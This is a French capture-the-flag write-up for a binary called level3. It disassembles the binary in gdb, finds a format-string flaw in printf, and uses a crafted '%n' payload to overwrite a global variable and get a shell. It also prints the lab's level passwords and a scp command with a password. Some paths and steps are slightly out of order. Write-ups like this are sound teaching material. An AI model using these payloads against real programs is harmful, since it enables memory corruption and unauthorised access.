On se connecte sur le level0, ou se trouve un **binaire** <code>level3</code>.

On cherche a savoir ce que fait ce binaire:
```gdb
> gdb level3 -q
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) > disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
> disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
End of assembler dump.
```
Ici, il est impossible de faire un **buffer overflow** avec le fgets car il prend une taille plus petite que la taille max de notre variable:
> <pre><code>char str[520];
> fgets(str, 512, stdin);</code></pre>

Cependant on peut faire un **Format String Exploit** avec le **printf**

On commence par chercher l'**Offset**:
<pre><code> > python -c 'print "BBBB" + "|%08x" * 4' | ./level3
BBBB|00000200|b7fd1ac0|b7ff37d0|42424242
</code></pre>
> Ici le 08 nous permet de forcer l'affichage d'une adresse
>
> Et le 42424242 représente notre B en ASCII

On cherche par la suite l'adresse de **m**:
<pre><code>> objdump -t level3 | grep m
level3:     file format elf32-i386
...
0804988c g     O .bss   00000004              m
...</code></pre>

<pre><code>> cd ../level4 && cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
</code></pre>

```gdb
> python -c 'print "\x8c\x98\x04\x08" + "%4$08n"' > /tmp/payload
> gdb -q level3
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) > b *0x080484df
Breakpoint 1 at 0x80484df
(gdb) > run < /tmp/payload
Starting program: /home/user/level3/level3 < /tmp/payload


Breakpoint 1, 0x080484df in v ()
(gdb) > x/x 0x804988c
0x804988c <m>:  0x00000004
```
On sait que l'on cherche 64 ($0x40), donc il nous manque 60

<pre><code>> (python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$08n"'; cat) | ./level3
                                                         512
Wait what?!
> cd ../level4 && cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
</code></pre>


For download :
<pre><code>scp -P4242 level3@192.168.1.78:level3 .</code></pre>
> Password : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
